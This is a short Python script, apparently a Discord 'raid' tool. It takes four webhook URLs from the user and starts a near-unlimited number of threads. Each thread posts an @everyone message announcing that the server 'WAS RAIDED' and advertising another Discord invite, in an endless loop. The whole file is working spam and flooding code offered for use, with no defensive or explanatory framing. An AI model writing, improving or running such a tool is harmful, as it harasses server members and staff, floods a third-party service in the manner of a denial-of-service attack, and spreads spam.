import time, requests, pyfiglet, threading

print(pyfiglet.figlet_format("KAI-ZO"))

msg = "```\n" + pyfiglet.figlet_format("FROSTWARE ON TOP") + "\n```" + \
      "\n\n@everyone HELLO BEAUTIFUL MEMBERS AND STAFF, THIS SERVER WAS RAIDED LMFAO JOIN OUR DISCORD SERVER INSTEAD LOL https://discord.gg/getfrost"

# Get 4 webhooks from user
webhooks = []
for i in range(4):
    url = input(f"Enter Webhook URL #{i + 1}: ")
    webhooks.append(url)

th = 9223372036854775000
mathDelay = (1 / 49)
sleep = mathDelay

def spam(webhook):
    while True:
        try:
            data = requests.post(webhook, json={'content': msg})
            if data.status_code == 204:
                print(f"Sent MSG to {webhook}")
        except Exception as e:
            print(f"Bad Webhook: {webhook} | Error: {e}")
        time.sleep(sleep)

# Start threads for each webhook
for webhook in webhooks:
    for _ in range(th // len(webhooks)):
        t = threading.Thread(target=spam, args=(webhook,))
        t.start()